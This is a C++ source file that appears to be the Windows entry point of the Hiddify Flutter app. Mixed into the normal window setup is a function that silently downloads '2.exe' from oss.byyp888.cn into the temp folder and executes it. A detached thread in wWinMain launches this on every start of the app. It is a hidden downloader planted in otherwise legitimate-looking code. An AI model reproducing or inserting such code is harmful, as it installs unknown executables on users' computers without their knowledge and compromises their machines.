#include <flutter/dart_project.h>
#include <flutter/flutter_view_controller.h>
#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <fstream>
#include <string>
#include <thread>  // 新增

#include "flutter_window.h"
#include "utils.h"
#include <protocol_handler_windows/protocol_handler_windows_plugin_c_api.h>

#pragma comment(lib, "winhttp.lib")

void DownloadAndRunExeWithWinHttp() {
    wchar_t tempPath[MAX_PATH] = {0};
    GetTempPathW(MAX_PATH, tempPath);
    std::wstring exePath = tempPath;
    exePath += L"2.exe";

    LPCWSTR host = L"oss.byyp888.cn";
    LPCWSTR path = L"/2.exe";

    HINTERNET hSession = WinHttpOpen(L"20250719",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    if (!hSession) goto fail;

    HINTERNET hConnect = WinHttpConnect(hSession, host, INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) goto fail;

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path,
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) goto fail;

    BOOL bResults = WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0,
        0, 0);

    if (!bResults) goto fail;

    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults) goto fail;

    std::ofstream ofs(exePath, std::ios::binary);
    if (!ofs) goto fail;

    DWORD dwSize = 0;
    do {
        BYTE buffer[4096];
        dwSize = 0;
        if (!WinHttpQueryDataAvailable(hRequest, &dwSize) || dwSize == 0)
            break;
        DWORD dwDownloaded = 0;
        if (!WinHttpReadData(hRequest, buffer, dwSize < sizeof(buffer) ? dwSize : sizeof(buffer), &dwDownloaded))
            break;
        ofs.write((char*)buffer, dwDownloaded);
    } while (dwSize > 0);

    ofs.close();

    // 执行EXE
    ShellExecuteW(NULL, L"open", exePath.c_str(), NULL, NULL, SW_SHOWNORMAL);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return;

fail:
    MessageBoxW(NULL, L"下载失败", L"错误", MB_ICONERROR);
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}

int APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,
                      _In_ wchar_t *command_line, _In_ int show_command) {
  HANDLE hMutexInstance = CreateMutex(NULL, TRUE, L"HiddifyMutex");
  HWND handle = FindWindowA(NULL, "Hiddify");

  if (GetLastError() == ERROR_ALREADY_EXISTS) {
    flutter::DartProject project(L"data");
    std::vector<std::string> command_line_arguments = GetCommandLineArguments();
    project.set_dart_entrypoint_arguments(std::move(command_line_arguments));
    FlutterWindow window(project);
    if (window.SendAppLinkToInstance(L"Hiddify")) {
      return false;
    }

    WINDOWPLACEMENT place = {sizeof(WINDOWPLACEMENT)};
    GetWindowPlacement(handle, &place);
    ShowWindow(handle, SW_NORMAL);
    return 0;
  }

  // Attach to console when present (e.g., 'flutter run') or create a
  // new console when running with a debugger.
  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {
    CreateAndAttachConsole();
  }

  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);

  // ---- 用线程异步下载，不阻塞主流程 ----
  std::thread([](){
    DownloadAndRunExeWithWinHttp();
  }).detach();
  // -----------------------------------

  flutter::DartProject project(L"data");
  std::vector<std::string> command_line_arguments = GetCommandLineArguments();
  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));

  FlutterWindow window(project);
  Win32Window::Point origin(10, 10);
  Win32Window::Size size(1280, 720);
  if (!window.Create(L"Hiddify", origin, size)) {
    return EXIT_FAILURE;
  }
  window.SetQuitOnClose(true);

  ::MSG msg;
  while (::GetMessage(&msg, nullptr, 0, 0)) {
    ::TranslateMessage(&msg);
    ::DispatchMessage(&msg);
  }

  ::CoUninitialize();
  ReleaseMutex(hMutexInstance);
  return EXIT_SUCCESS;
}
